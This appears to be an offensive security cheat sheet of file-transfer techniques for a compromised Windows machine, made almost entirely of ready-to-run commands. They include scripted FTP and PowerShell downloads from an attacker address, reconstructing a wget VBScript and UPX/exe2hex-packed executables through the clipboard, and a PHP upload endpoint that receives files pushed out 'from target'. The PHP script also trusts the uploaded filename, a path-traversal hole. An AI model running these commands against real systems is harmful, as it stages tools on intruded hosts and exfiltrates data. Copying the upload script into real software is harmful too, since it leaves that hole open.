# File Uploads

## Windows 

### Non-interactive FTP

```
echo open ipaddress> ftp.txt
echo USER username>> ftp.txt
echo password>> ftp.txt
echo bin>> ftp.txt
echo GET filename>> ftp.txt
echo bye>> ftp.txt
ftp -n -v -s:ftp.txt
```

### VBScript

```
curl -L -O https://gist.githubusercontent.com/maddouri/da64f298e19bff0cd1ce46ee83317bfe/raw/90080a73b892b09dde9dd2c787814bac502d7f46/wget.vbs
```
```
cat wget.vbs | sed -e 's/^/echo /' | sed -e 's/$/>> wget.vbs/' > wget.vbs.echo
cat wget.vbs.echo | xclip -selection clipboard
```
```
cscript wget.vbs <url> (file)
```

### Powershell

```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://ipaddress/filename', 'filename')
```

### Clipboard

```
upx -9 file.exe # compresses the file inplace
exe2hex -x file.exe -p fild.cmd
cat file.cmd | xclip -selection clipboard
```

# File Donwloads

## Local upload PHP

```
sudo mkdir /var/www/uploads
sudo chown www-data /var/www/uploads
```
In `/var/www/html/upload.php`:
```
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile);
?>
```
From target:
```
powershell (New-Object System.Net.WebClient).UploadFile('http://ipaddress/upload.php', 'filename')
```
